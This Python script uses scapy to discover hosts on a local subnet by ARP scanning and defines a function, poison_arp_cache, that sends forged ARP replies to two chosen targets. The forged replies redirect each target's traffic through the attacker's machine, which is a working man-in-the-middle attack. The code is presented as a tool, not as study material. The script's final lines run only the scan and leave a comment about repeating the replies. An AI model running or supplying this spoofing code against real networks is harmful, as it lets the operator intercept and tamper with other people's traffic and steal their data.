from scapy.all import *
from scapy.all import ARP, Ether, srp
import psutil

from util import get_prefix_length, apply_mask, AddressFamily

def scan_hosts(subnet):
    """Scans the subnet (in cidr notation) and returns a list of hosts
    """
    packet = Ether() / ARP()
    packet[ARP].pdst = subnet
    packet[Ether].dst = 'ff:ff:ff:ff:ff:ff'

    answered_requests, unanswered_requests = srp(packet, timeout=10, verbose=0)
    hosts = [{
        'ip_address': response.psrc,
        'mac_address': response.hwsrc
    } for request, response in answered_requests]

    return hosts

def get_interfaces():
    """Returns a dictionary of the interfaces
    """
    interfaces = psutil.net_if_addrs()
    interfaces_data = {}

    # Iterate over the interfaces
    for name, addresses in interfaces.items():
        interface_data = { 'name': name }

        # Loop over the addresses of the different OSI layers
        # (we are only interested in the link and network layers)
        for address in addresses:
            if address.family == AddressFamily.AF_LINK:
                interface_data['mac_address'] = address.address
            elif address.family == AddressFamily.AF_INET:
                network_ip = apply_mask(address.address, address.netmask)
                prefix_length = get_prefix_length(address.netmask)

                interface_data['ip_address'] = address.address
                interface_data['netmask'] = address.netmask
                interface_data['subnet'] = f'{network_ip}/{prefix_length}'

        interfaces_data[name] = interface_data

    return interfaces_data

def poison_arp_cache(interface_name, attacker, target1, target2):
    # send ARP reply to target 1
    # send ARP reply to target 2
    
    # Send mac of attacker to target 1
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target1['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target2['ip_address']
    packet[ARP].hwdst = target1['mac_address']
    packet[ARP].pdst = target1['ip_address']

    packet.show()

    sendp(packet, iface=interface_name)

    # Send mac of attacker to target 2
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target2['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target1['ip_address']
    packet[ARP].hwdst = target2['mac_address']
    packet[ARP].pdst = target2['ip_address']

    packet.show()
    sendp(packet, iface=interface_name)

    # repeat ARP replies every X seconds


interface = get_interfaces()['Wi-Fi']
hosts = scan_hosts(interface['subnet'])
print(hosts)
